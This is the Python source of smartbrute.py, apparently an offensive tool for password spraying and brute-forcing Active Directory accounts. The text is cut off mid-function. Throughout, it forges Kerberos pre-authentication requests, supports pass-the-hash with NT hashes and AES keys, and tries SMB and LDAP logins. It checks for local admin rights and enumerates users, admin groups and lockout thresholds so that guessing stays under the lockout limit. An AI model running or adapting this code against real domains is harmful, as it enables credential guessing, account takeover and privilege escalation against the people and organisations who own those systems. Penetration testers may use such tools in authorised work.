#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : smartbrute.py
# Authors            : Shutdown (@_nwodtuhs) & Podalirius (@podalirius_)
# Date created       : 16/04/2021 (dd/mm/yyyy)
# Python Version     : 3.*

import argparse
import os
import re
import socket
import random
import ssl
import struct
import datetime
import time
import ldap3
from six import b
from binascii import unhexlify
from ldap3.protocol.formatters.formatters import format_sid
from pyasn1.codec.der import decoder, encoder
from pyasn1.error import PyAsn1Error
from pyasn1.type.univ import noValue, Sequence
from pyasn1.type.useful import GeneralizedTime
from impacket.smbconnection import SMBConnection, SessionError
from impacket.ldap import ldap, ldapasn1
from impacket.ntlm import compute_nthash
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
from impacket.krb5 import constants
from impacket.dcerpc.v5 import scmr
from impacket.dcerpc.v5.transport import SMBTransport
from impacket.krb5.asn1 import AS_REQ, KRB_ERROR, AS_REP, AP_REQ, seq_set_iter, PA_ENC_TS_ENC, EncryptedData, METHOD_DATA, ETYPE_INFO2, ETYPE_INFO, Authenticator, TGS_REP, seq_set
from impacket.krb5.types import KerberosTime, Principal,Ticket
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.kerberosv5 import KerberosError, getKerberosTGT, getKerberosTGS
from rich.console import Console
from rich.columns import Columns
from rich import box
from rich.table import Table
from rich.live import Live
try:
    from neo4j.v1 import GraphDatabase
except ImportError:
    from neo4j import GraphDatabase
from neo4j.exceptions import AuthError, ServiceUnavailable

# sprahound's global vars
ERROR_SUCCESS                       = (0, "")
ERROR_NEO4J_NON_EXISTENT_NODE       = (102, "Node does not exist in database")
ERROR_NO_PATH                       = (103, "No admin path from this node")

smb_error_status = {
    "STATUS_ACCOUNT_DISABLED":"disabled",
    "STATUS_ACCOUNT_EXPIRED":"expired",
    "STATUS_ACCOUNT_RESTRICTION":"STATUS_ACCOUNT_RESTRICTION",
    "STATUS_INVALID_LOGON_HOURS":"STATUS_INVALID_LOGON_HOURS",
    "STATUS_INVALID_WORKSTATION":"STATUS_INVALID_WORKSTATION",
    "STATUS_LOGON_TYPE_NOT_GRANTED":"STATUS_LOGON_TYPE_NOT_GRANTED",
    "STATUS_PASSWORD_EXPIRED":"pwd expired",
    "STATUS_PASSWORD_MUST_CHANGE":"pwd must change",
    "STATUS_ACCESS_DENIED":"access denied"
}

VERSION="0.1"


class KERBEROS(object):
    """docstring for Kerberos."""

    def __init__(self):
        super(KERBEROS, self).__init__()
        self.salts = {}
        self.principal_unknown = []
        self.disabled_account = []
        self.response_to_big = []
        self.server_time = ""


    def get_machine_name(self, kdc_ip, domain):
        if kdc_ip is not None:
            s = SMBConnection(kdc_ip, kdc_ip)
        else:
            s = SMBConnection(domain, domain)
        try:
            s.login("", "")
        except Exception:
            if s.getServerName() == "":
                raise Exception("Error while anonymous logging into %s" % domain)
        else:
            s.logoff()
        return s.getServerName()


    def send_receive(self, data, host, kdcHost, tproto):
        if kdcHost is None:
            targetHost = host
        else:
            targetHost = kdcHost
        if tproto == "tcp":
            messageLen = struct.pack("!i", len(data))
            logger.debug("Trying to connect to KDC at %s using TCP" % targetHost)
            try:
                af, socktype, proto, canonname, sa = socket.getaddrinfo(targetHost, 88, 0, socket.SOCK_STREAM)[0]
                s = socket.socket(af, socket.SOCK_STREAM, socket.IPPROTO_TCP)
                s.connect(sa)
            except socket.error as e:
                raise socket.error("Connection error (%s:%s)" % (targetHost, 88), e)
            s.sendall(messageLen + data)
            recvDataLen = struct.unpack("!i", s.recv(4))[0]
            r = s.recv(recvDataLen)
            while len(r) < recvDataLen:
                r += s.recv(recvDataLen - len(r))
        elif tproto == "udp":
            logger.debug("Trying to connect to KDC at %s using UDP" % targetHost)
            try:
                af, socktype, proto, canonname, sa = socket.getaddrinfo(targetHost, 88, 0, socket.SOCK_STREAM)[0]
                s = socket.socket(af, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                s.connect(sa)
            except socket.error as e:
                raise socket.error("Connection error (%s:%s)" % (targetHost, 88), e)
            s.send(data)
            r = s.recv(8192)
            # we want the server time
            for i in decoder.decode(r):
                if type(i) == Sequence:
                    for k in vars(i)["_componentValues"]:
                        if type(k) == GeneralizedTime:
                            self.server_time = datetime.datetime.strptime(k.asOctets().decode("utf-8"), "%Y%m%d%H%M%SZ")
        try:
            krbError = KerberosError(packet=decoder.decode(r, asn1Spec=KRB_ERROR())[0])
        except:
            return r
        if krbError.getErrorCode() != constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
            raise krbError
        return r


    def get_users_salts(self, target, domain, user, rc4_key, etype, tproto):
        logger.debug("Getting Kerberos salts for %s through an AS-REQ" % user)
        asReq = AS_REQ()

        domain = domain.upper()
        serverName = Principal("krbtgt/%s" % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        clientName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        # need to remove the PAC request for UDP to work and not have the KDC throw KRB_ERR_RESPONSE_TOO_BIG
        # pacRequest = KERB_PA_PAC_REQUEST()
        # pacRequest["include-pac"] = True
        # encodedPacRequest = encoder.encode(pacRequest)

        asReq["pvno"] = 5
        asReq["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        # asReq["padata"] = noValue
        # asReq["padata"][0] = noValue
        # asReq["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        # asReq["padata"][0]["padata-value"] = encodedPacRequest

        reqBody = seq_set(asReq, "req-body")

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody["kdc-options"] = constants.encodeFlags(opts)

        seq_set(reqBody, "sname", serverName.components_to_asn1)
        seq_set(reqBody, "cname", clientName.components_to_asn1)

        if domain == "":
            raise Exception("Empty Domain not allowed in Kerberos")

        reqBody["realm"] = domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        reqBody["till"] = KerberosTime.to_asn1(now)
        reqBody["rtime"] = KerberosTime.to_asn1(now)
        reqBody["nonce"] = random.getrandbits(31)

        if rc4_key == b"" or rc4_key is None:
            if etype == "rc4":
                supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
            elif etype == "aes128":
                supportedCiphers = (int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
            elif etype == "aes256":
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),)
        else:
            supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, "etype", supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = self.send_receive(data=message, host=domain, kdcHost=target, tproto=tproto)
        except Exception as e:
            if str(e).find("KDC_ERR_ETYPE_NOSUPP") >= 0:
                logger.error("Kerberos throws ETYPE_NOSUPP, try setting another with --etype")
            elif str(e).find("KDC_ERR_CLIENT_REVOKED") >= 0:
                logger.debug("User (%s) is disabled, adding to the list" % user)
                self.disabled_account.append(user)
            elif str(e).find("KDC_ERR_C_PRINCIPAL_UNKNOWN") >= 0:
                logger.debug("User (%s) doesn't exist, adding to the list" % user)
                self.principal_unknown.append(user)
            else:
                logger.debug("Something went wrong: %s" % e)
            return False

        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
        # "Do not require Kerberos preauthentication" set
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            # Most of the times we shouldn't be here, is this a TGT?
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]

        encryptionTypesData = dict()
        methods = decoder.decode(asRep["e-data"], asn1Spec=METHOD_DATA())[0]
        for method in methods:
            if method["padata-type"] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
                etypes2 = decoder.decode(method["padata-value"], asn1Spec=ETYPE_INFO2())[0]
                for etype2 in etypes2:
                    try:
                        if etype2["salt"] is None or etype2["salt"].hasValue() is False:
                            salt = ""
                        else:
                            salt = etype2["salt"].prettyPrint()
                    except PyAsn1Error:
                        salt = ""

                    encryptionTypesData[etype2["etype"]] = b(salt)
            elif method["padata-type"] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO.value:
                etypes = decoder.decode(method["padata-value"], asn1Spec=ETYPE_INFO())[0]
                for etype in etypes:
                    try:
                        if etype["salt"] is None or etype["salt"].hasValue() is False:
                            salt = ""
                        else:
                            salt = etype["salt"].prettyPrint()
                    except PyAsn1Error:
                        salt = ""

                    encryptionTypesData[etype["etype"]] = b(salt)
        return encryptionTypesData


    def pre_authentication(self, target, domain, user, password, etype, tproto, rc4_key=""):
        if user in self.principal_unknown:
            return False, ""
        elif user in self.disabled_account:
            return True, "disabled"
        else:
            # modified code from impacket/krb5/kerberosv5.py
            if isinstance(rc4_key, str):
                try:
                    rc4_key = unhexlify(rc4_key)
                except TypeError:
                    pass


            if rc4_key == b"" or rc4_key is None:
                if etype == "rc4":
                    supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
                    logger.debug("Logging in with domain, user, rc4 key for password (%s, %s, %s)" % (domain, user, password))
                elif etype == "aes128":
                    supportedCiphers = (int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                    logger.debug("Logging in with domain, user, aes128 key for password (%s, %s, %s)" % (domain, user, password))
                elif etype == "aes256":
                    supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),)
                    logger.debug("Logging in with domain, user, aes256 key for password (%s, %s, %s)" % (domain, user, password))
            else:
                supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
                logger.debug("Logging in with domain, user, rc4 key (%s, %s, %s)" % (domain, user, rc4_key))

            enc_type = supportedCiphers[0]
            cipher = _enctype_table[enc_type]

            # Pass the hash/aes key :P
            if rc4_key != b"" and isinstance(rc4_key, bytes):
                key = Key(cipher.enctype, rc4_key)
            else:
                if etype == "rc4":
                    key = Key(cipher.enctype, compute_nthash(password))
                else:
                    if user in self.salts.keys():
                        salts = self.salts[user]
                    else:
                        salts = self.get_users_salts(target=target, domain=domain, user=user, rc4_key=rc4_key, etype=etype, tproto=tproto)
                        # usually, salts are DOMAINuser, however, on Domain Controllers that went through a domain name change, fetching user slats is required
                        # salts = {enc_type: "%s%s" % (domain.upper(), user)}
                        if user in self.principal_unknown:
                            return False, ""
                        elif user in self.disabled_account:
                            return False, "disabled"
                        if not salts:
                            logger.debug("Couldn't get salts for %s" % user)
                            return False, ""
                        else:
                            self.salts[user] = salts
                    logger.debug("Using salt: %s" % salts[enc_type].decode("utf-8"))
                    key = cipher.string_to_key(password, salts[enc_type], None)

            # Let's build the timestamp
            timeStamp = PA_ENC_TS_ENC()

            now = datetime.datetime.utcnow()
            timeStamp["patimestamp"] = KerberosTime.to_asn1(now)
            timeStamp["pausec"] = now.microsecond

            # Encrypt the shyte
            encodedTimeStamp = encoder.encode(timeStamp)

            # Key Usage 1
            # AS-REQ PA-ENC-TIMESTAMP padata timestamp, encrypted with the
            # client key (Section 5.2.7.2)
            encryptedTimeStamp = cipher.encrypt(key, 1, encodedTimeStamp, None)

            encryptedData = EncryptedData()
            encryptedData["etype"] = cipher.enctype
            encryptedData["cipher"] = encryptedTimeStamp
            encodedEncryptedData = encoder.encode(encryptedData)

            asReq = AS_REQ()

            domain = domain.upper()
            serverName = Principal("krbtgt/%s" % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            clientName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

            asReq["pvno"] = 5
            asReq["msg-type"] =  int(constants.ApplicationTagNumbers.AS_REQ.value)

            asReq["padata"] = noValue
            asReq["padata"][0] = noValue
            asReq["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value)
            asReq["padata"][0]["padata-value"] = encodedEncryptedData

            reqBody = seq_set(asReq, "req-body")

            opts = list()
            opts.append( constants.KDCOptions.forwardable.value )
            opts.append( constants.KDCOptions.renewable.value )
            opts.append( constants.KDCOptions.proxiable.value )
            reqBody["kdc-options"] = constants.encodeFlags(opts)

            seq_set(reqBody, "sname", serverName.components_to_asn1)
            seq_set(reqBody, "cname", clientName.components_to_asn1)

            reqBody["realm"] =  domain

            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
            reqBody["till"] = KerberosTime.to_asn1(now)
            reqBody["rtime"] =  KerberosTime.to_asn1(now)
            reqBody["nonce"] = random.getrandbits(31)

            seq_set_iter(reqBody, "etype", (int(cipher.enctype),))

            try:
                tgt = self.send_receive(data=encoder.encode(asReq), host=domain, kdcHost=target, tproto=tproto)
                if tgt is not None:
                    return True, ""
            except Exception as e:
                if str(e).find("KDC_ERR_ETYPE_NOSUPP") >= 0:
                    logger.error("Kerberos throws ETYPE_NOSUPP, try setting another with --etype")
                elif str(e).find("KDC_ERR_CLIENT_REVOKED") >= 0:
                    logger.debug("User (%s) is disabled, adding to the list" % user)
                    self.disabled_account.append(user)
                    return False, "disabled"
                elif str(e).find("KRB_ERR_RESPONSE_TOO_BIG") >= 0:
                    logger.debug("Raised KRB_ERR_RESPONSE_TOO_BIG for User (%s), adding to the list" % user)
                    self.response_to_big.append(user)
                    return False, "KRB_ERR_RESPONSE_TOO_BIG"
                elif str(e).find("KDC_ERR_C_PRINCIPAL_UNKNOWN") >= 0:
                    logger.debug("User (%s) doesn't exist, adding to the list" % user)
                    self.principal_unknown.append(user)
                elif str(e).find("KRB_AP_ERR_SKEW") >= 0:
                    logger.debug("Raised KRB_AP_ERR_SKEW for User (%s), there is a time skew between the client and the server, adding to the list" % user)
                    return False, "KRB_AP_ERR_SKEW"
                else:
                    logger.debug("Something went wrong: %s" % e)
                return False, ""


    def LDAP_authentication(self, kdc_ip, tls_version, domain, user, password, rc4_key, aes_key, ccache_ticket, dc_host):
        # todo : check LDAP or LDAPS is open before connecting, if port is closed, ask the user if he's sure he's testing a domain controller

        if user is None:
            user = ""
        if domain is None:
            domain = ""
        if tls_version is not None:
            use_ssl = True
            port = 636
            tls = ldap3.Tls(validate=ssl.CERT_NONE, version=tls_version)
        else:
            use_ssl = False
            port = 389
            tls = None

        if ccache_ticket is not None:
            pass

        if isinstance(rc4_key, str):
            try:
                rc4_key = unhexlify(rc4_key)
            except TypeError:
                pass

        TGT = None
        TGS = None

        if ccache_ticket is not None:
            try:
                ccache = CCache.loadFile(ccache_ticket)
            except Exception as e:
                # No cache present
                logger.error(e)
                pass
            else:
                # retrieve domain information from CCache file if needed
                if domain == "":
                    domain = ccache.principal.realm["data"].decode("utf-8")
                    logger.debug("Domain retrieved from CCache: %s" % domain)

                if not dc_host:
                    target = self.get_machine_name(kdc_ip, domain)
                else:
                    target = dc_host

                logger.debug("Using Kerberos Cache: %s" % ccache_ticket)
                principal = "ldap/%s@%s" % (target.upper(), domain.upper())

                creds = ccache.getCredential(principal)
                if creds is None:
                    # Let's try for the TGT and go from there
                    principal = "krbtgt/%s@%s" % (domain.upper(), domain.upper())
                    creds = ccache.getCredential(principal)
                    if creds is not None:
                        TGT = creds.toTGT()
                        logger.debug("Using TGT from cache")
                    else:
                        logger.debug("No valid credentials found in cache")
                else:
                    TGS = creds.toTGS(principal)
                    logger.debug("Using TGS from cache")

                # retrieve user information from CCache file if needed
                if user == "" and creds is not None:
                    user = creds["client"].prettyPrint().split(b"@")[0].decode("utf-8")
                    logger.debug("Username retrieved from CCache: %s" % user)
                elif user == "" and len(ccache.principal.components) > 0:
                    user = ccache.principal.components[0]["data"].decode("utf-8")
                    logger.debug("Username retrieved from CCache: %s" % user)
        else:
            if not dc_host:
                target = self.get_machine_name(kdc_ip, domain)
            else:
                target = dc_host

        # First of all, we need to get a TGT for the user
        userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        if TGT is None:
            if TGS is None:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=userName, password=password, domain=domain, lmhash=None, nthash=rc4_key, aesKey=aes_key, kdcHost=kdc_ip)
        else:
            tgt = TGT["KDC_REP"]
            cipher = TGT["cipher"]
            sessionKey = TGT["sessionKey"]

        if TGS is None:
            serverName = Principal("ldap/%s" % target, type=constants.PrincipalNameType.NT_SRV_INST.value)
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName=serverName, kdcHost=kdc_ip, domain=domain, tgt=tgt, cipher=cipher, sessionKey=sessionKey)
        else:
            tgs = TGS["KDC_REP"]
            cipher = TGS["cipher"]
            sessionKey = TGS["sessionKey"]

            # Let's build a NegTokenInit with a Kerberos REQ_AP

        blob = SPNEGO_NegTokenInit()

        # Kerberos
        blob["MechTypes"] = [TypesMech["MS KRB5 - Microsoft Kerberos 5"]]

        # Let's extract the ticket from the TGS
        tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        ticket = Ticket()
        ticket.from_asn1(tgs["ticket"])

        # Now let's build the AP_REQ
        apReq = AP_REQ()
        apReq["pvno"] = 5
        apReq["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = []
        apReq["ap-options"] = constants.encodeFlags(opts)
        seq_set(apReq, "ticket", ticket.to_asn1)

        authenticator = Authenticator()
        authenticator["authenticator-vno"] = 5
        authenticator["crealm"] = domain
        seq_set(authenticator, "cname", userName.components_to_asn1)
        now = datetime.datetime.utcnow()

        authenticator["cusec"] = now.microsecond
        authenticator["ctime"] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 11
        # AP-REQ Authenticator (includes application authenticator
        # subkey), encrypted with the application session key
        # (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)

        apReq["authenticator"] = noValue
        apReq["authenticator"]["etype"] = cipher.enctype
        apReq["authenticator"]["cipher"] = encryptedEncodedAuthenticator

        blob["MechToken"] = encoder.encode(apReq)

        if tls_version is not None:
            ldap_connection = ldap.LDAPConnection("ldaps://%s" % target, dstIp=kdc_ip)
        else:
            ldap_connection = ldap.LDAPConnection("ldap://%s" % target, dstIp=kdc_ip)

        bindRequest = ldapasn1.BindRequest()
        bindRequest["version"] = 3
        bindRequest["name"] = user
        bindRequest["authentication"]["sasl"]["mechanism"] = "GSS-SPNEGO"
        bindRequest["authentication"]["sasl"]["credentials"] = blob.getData()
        response = ldap_connection.sendReceive(bindRequest)[0]["protocolOp"]

        if response["bindResponse"]["resultCode"] != ldapasn1.ResultCode("success"):
            raise ldap.LDAPSessionError(
                errorString="Error in bindRequest -> %s: %s" % (response["bindResponse"]["resultCode"].prettyPrint(),
                                                                response["bindResponse"]["diagnosticMessage"])
            )

        return ldap_connection


class NTLM(object):
    """docstring for NTLM."""

    def __init__(self):
        super(NTLM, self).__init__()


    def is_local_admin(self, smb_connection, target):
        # https://github.com/SecureAuthCorp/impacket/blob/a16198c3312d8cfe25b329907b16463ea3143519/impacket/examples/ntlmrelayx/clients/smbrelayclient.py#L606-L622
        rpc_transport = SMBTransport(remoteName=smb_connection.getRemoteHost(), dstport=445, filename=r"\svcctl", smb_connection=smb_connection)
        dce = rpc_transport.get_dce_rpc()
        try:
            dce.connect()
        except:
            pass
        else:
            dce.bind(scmr.MSRPC_UUID_SCMR)
            try:
                # 0xF003F - SC_MANAGER_ALL_ACCESS
                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
                ans = scmr.hROpenSCManagerW(dce, "{}\x00".format(target), "ServicesActive\x00", 0xF003F)
                return True
            except scmr.DCERPCException as e:
                pass
        return False


    def SMB_authentication(self, target, domain, user, password, nt_hash):

        """Returns a tuple (smb_connection, details)

        :return: a tuple with the smb_connection and a string (error or specific information regarding the account)
        """
        if target == "":
            logger.error("No target was set. Set a domain with -d/--domain or a target with --dc-ip.")
            exit(0)
        try:
            logger.debug("Connecting to smb://%s on port 445" % target)
            smb_connection = SMBConnection(target, target, None, "445", timeout=15)
        except socket.error:
            return False, ""
        except Exception as e:
            logger.error("Error connection to the target. Try to set -p/--protocol to LDAP.")
            exit(0)
            # return False, ""
        if nt_hash is None:
            nt_hash = ""
        try:
            logger.debug("Logging in with domain, user, password, nt_hash (%s, %s, %s, %s)" % (domain, user, password, nt_hash))
            smb_connection.login(domain=domain, user=user, password=password, nthash=nt_hash)
            if self.is_local_admin(smb_connection=smb_connection, target=target):
                return smb_connection, "local admin"
            else:
                return smb_connection, ""
        except SessionError as e:
            error, description = e.getErrorString()
            if error in smb_error_status.keys():
                return None, error
            else:
                return False, ""


    def LDAP_authentication(self, tls_version, target, domain, user, password, lm_hash, nt_hash):
        # todo : check LDAP or LDAPS is open before connecting, if port is closed, ask the user if he's sure he's testing a domain controller
        if nt_hash is None:
            nt_hash = ""
        if lm_hash is None:
            lm_hash = ""
        
        try:
            if tls_version is not None:
                logger.debug("Connecting to ldaps://%s" % target)
                ldap_connection = ldap.LDAPConnection(url="ldaps://%s" % target)
            else:
                logger.debug("Connecting to ldap://%s" % target)
                ldap_connection = ldap.LDAPConnection(url="ldap://%s" % target)
            
            logger.debug("Logging in with domain, user, password, lm_hash, nt_hash (%s, %s, %s, %s, %s)" % (domain, user, password, lm_hash, nt_hash))
            ldap_connection.login(domain=domain, user=user, password=password, lmhash=lm_hash, nthash=nt_hash)
            return ldap_connection
        except ldap.LDAPSessionError as e:
            logger.debug("Triggered exception on a LDAP session error")
            if "strongerAuthRequired" in str(e):
                logger.debug("A stronger auth is required, trying with LDAPS")
                try:
                    logger.debug("Connecting to ldap://%s" % target)
                    ldap_connection = ldap.LDAPConnection(url="ldaps://%s" % target)
                    logger.debug("Logging in with domain (%s), user (%s) and password (%s)" % (domain, user, password))
                    ldap_connection.login(domain=domain, user=user, password=password, lmhash=lm_hash, nthash=nt_hash)
                    return ldap_connection
                except ldap.LDAPSessionError as e:
                    logger.debug("Trying LDAPS didn't resolve the LDAP session error, below is the exception")
                    logger.error(e)
            else:
                logger.debug("No stronger auth was required, username/password supplied was probably wrong")
            return False

        except OSError as e:
            if domain is None:
                logger.error("Error connecting to the domain, please set option -d/--domain")
            else:
                logger.error("Error connecting to the domain, please set option --dc-ip with the IP address of the domain controller")
            exit(0)


class bruteforce(object):
    """docstring for bruteforce."""

    def __init__(self, options, table, neo4j):
        super(bruteforce, self).__init__()
        self.options = options
        self.table = table
        self.neo4j = neo4j
        self.ntlm = NTLM()
        self.kerberos = KERBEROS()
        self.global_lockout_threshold = 0
        self.granular_lockout_threshold = {}
        self.users = {}
        self.special_groups = {}
        self.admin_users = []
        self.special_users = []
        self.domain_is_dumped = False

    def process_user_record(self, item):
        if isinstance(item, ldapasn1.SearchResultEntry) is not True:
            return
        sAMAccountName = ""
        badPwdCount = 0
        distinguishedName = ""
        try:
            for attribute in item["attributes"]:
                if str(attribute["type"]) == "sAMAccountName":
                    # todo : plan to include a --machine-accounts switch to test machine accounts (nota bene: by default, they don't lock out)
                    # We want to filter out machine accounts
                    if attribute["vals"][0].asOctets().decode("utf-8").endswith("$") is False:
                        sAMAccountName = attribute["vals"][0].asOctets().decode("utf-8")
                if str(attribute["type"]) == "badPwdCount":
                    badPwdCount = int(str(attribute["vals"][0]))
                if str(attribute["type"]) == "distinguishedName":
                    distinguishedName = attribute["vals"][0].asOctets().decode("utf-8")
            if distinguishedName in self.granular_lockout_threshold.keys():
                lockoutThreshold = self.granular_lockout_threshold[distinguishedName]
            else:
                lockoutThreshold = self.global_lockout_threshold
            self.users[distinguishedName] = {"distinguishedName":distinguishedName, "sAMAccountName":sAMAccountName, "badPwdCount":badPwdCount, "lockoutThreshold":lockoutThreshold}
        except Exception as e:
            logger.error("Skipping item, cannot process due to error %s" % str(e))


    def process_group_record(self, item):
        if isinstance(item, ldapasn1.SearchResultEntry) is not True:
            return
        sAMAccountName = ""
        group_type = ""
        distinguishedName = ""
        try:
            for attribute in item["attributes"]:
                # print(attribute)
                if str(attribute["type"]) == "objectSid":
                    objectSid = format_sid(attribute["vals"][0].asOctets())
                    if objectSid.split("-")[-1] in ["512", "516", "518", "519", "526", "527", "544"]:
                        group_type = "admin"
                    elif objectSid.split("-")[-1] in ["520", "547", "548", "549", "551", "552", "582"]:
                        group_type = "special"
                if str(attribute["type"]) == "distinguishedName":
                    distinguishedName = attribute["vals"][0].asOctets().decode("utf-8")
                if str(attribute["type"]) == "sAMAccountName":
                    sAMAccountName = attribute["vals"][0].asOctets().decode("utf-8")
            if group_type in ["admin", "special"]:
                self.special_groups[distinguishedName] = {"distinguishedName":distinguishedName, "sAMAccountName":sAMAccountName, "group_type":group_type}
        except Exception as e:
            logger.error("Skipping item, cannot process due to error %s" % str(e))


    def get_privileged_users(self, ldap_connection, domain):
        if domain is None or "." not in domain:
            logger.error("FQDN Domain is needed to fetch domain information from LDAP")
            exit(0)
        else:
            domain_dn = ",".join(["DC=" + part for part in domain.split(".")])

        # todo : add argument that makes the user choose a page size and set it for "size"
        paged_results_control = ldap.SimplePagedResultsControl(criticality=True, size=200, cookie="")
        ldap_connection.search(searchBase=domain_dn, searchFilter="(objectCategory=Group)", attributes=["sAMAccountName", "objectSid", "distinguishedName"], searchControls=[paged_results_control], perRecordCallback=self.process_group_record)
        admin_users = []
        special_users = []
        for group_dn in self.special_groups.keys():
            if self.special_groups[group_dn]["group_type"] == "admin":
                for user_dn in self.members_dn_from_group_dn(ldap_connection=ldap_connection, object_dn=group_dn):
                    # group = self.special_groups[group_dn]["sAMAccountName"]
                    try:
                        user = self.get_attributes_from_object_dn(ldap_connection=ldap_connection, object_dn=user_dn, attributes=["sAMAccountName"])["sAMAccountName"].decode("utf-8")
                        admin_users.append(user)
                    except:
                        logger.debug("Met some kind of error while trying to get attrs from object dn %s" % user_dn)
            elif self.special_groups[group_dn]["group_type"] == "special":
                for user_dn in self.members_dn_from_group_dn(ldap_connection=ldap_connection, object_dn=group_dn):
                    user = self.get_attributes_from_object_dn(ldap_connection=ldap_connection, object_dn=user_dn, attributes=["sAMAccountName"])["sAMAccountName"].decode("utf-8")
                    special_users.append(user)
        self.admin_users = list(set(admin_users))
        self.special_users = list(set(special_users))
        logger.debug("Found %d special/admin users" % len(list(set(admin_users + special_users))))


    def get_attributes_from_object_dn(self,ldap_connection, object_dn, attributes):
        logger.debug("Fetching attributes for object: %s" % object_dn)
        attrs = {}
        results = ldap_connection.search(searchBase=object_dn, attributes=attributes)
        for result in results:
            for attribute in result["attributes"]:
                if str(attribute["type"]) in attributes:
                    if len(attribute["vals"]) > 1:
                        attrs[str(attribute["type"])] = []
                        for i in attribute["vals"]:
                            attrs[str(attribute["type"])].append(i.asOctets())
                    else:
                        attrs[str(attribute["type"])] = attribute["vals"][0].asOctets()
        return attrs


    def get_users(self, ldap_connection, domain):
        if domain is None or "." not in domain:
            logger.error("FQDN Domain is needed to fetch domain information from LDAP")
            exit(0)
        else:
            domain_dn = ",".join(["DC=" + part for part in domain.split(".")])

        # any user that is not disabled
        search_filters = "(&(objectCategory=User)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
        # search_filters = "(objectCategory=User)"
        # we want username and attempts left for each account
        attributes = ["samAccountName", "badPwdCount", "distinguishedName"]

        # todo : add argument that makes the user choose a page size and set it for "size"
        paged_results_control = ldap.SimplePagedResultsControl(criticality=True, size=200, cookie="")
        ldap_connection.search(searchBase=domain_dn, searchFilter=search_filters, attributes=attributes, searchControls=[paged_results_control], perRecordCallback=self.process_user_record)
        logger.verbose("Found %d users" % len(self.users))
        for user in self.users.keys():
            logger.debug("   %-25s %-15d %-15d %-15s" % (self.users[user]["sAMAccountName"], self.users[user]["badPwdCount"], self.users[user]["lockoutThreshold"], user))


    def get_lockout_thresholds(self, ldap_connection, domain):
        if domain is None or "." not in domain:
            logger.error("FQDN Domain is needed to fetch domain information from LDAP")
            exit(0)
        else:
            domain_dn = ",".join(["DC=" + part for part in domain.split(".")])

        logger.verbose("Fetching domain level lockout threshold")
        try:
            results = ldap_connection.search(searchBase=domain_dn, searchFilter="(objectClass=*)", attributes=["lockoutThreshold"], sizeLimit=999)
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find("sizeLimitExceeded") >= 0:
                logger.debug("sizeLimitExceeded exception caught, giving up and processing the data received")
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                results = e.getAnswers()
        self.global_lockout_threshold = int(results[0]["attributes"][0]["vals"][0].asOctets())
        logger.debug("Global lockout threshold %d" % self.global_lockout_threshold)

        logger.verbose("Fetching granular lockout thresholds in Password Settings Containers")
        granular_policy_container = "CN=Password Settings Container,CN=System,%s" % domain_dn
        granular_policy_filter = "(objectClass=msDS-PasswordSettings)"
        granular_policy_attribs = ["msDS-LockoutThreshold", "msDS-PSOAppliesTo"]
        try:
            results = ldap_connection.search(searchBase=granular_policy_container, searchFilter=granular_policy_filter, attributes=granular_policy_attribs, sizeLimit=999)
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find("sizeLimitExceeded") >= 0:
                logger.debug("sizeLimitExceeded exception caught, giving up and processing the data received")
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                results = e.getAnswers()
        for policy in results:
            if isinstance(policy, ldapasn1.SearchResultEntry):
                if policy[1][1].hasValue() and str(policy[1][1][0]) == "msDS-PSOAppliesTo":
                    for element in policy[1][1][1]:
                        applies_to_dn = element.asOctets().decode("utf-8")
                        # applies_to_dn = policy[1][1][1][0].asOctets().decode("utf-8")
                        if str(policy[1][0][0]) == "msDS-LockoutThreshold":
                            lockout_threshold = int(policy[1][0][1][0].asOctets())
                            if self.is_a_group(ldap_connection, applies_to_dn):
                                members_dn = self.members_dn_from_group_dn(ldap_connection, applies_to_dn)
                                for member_dn in members_dn:
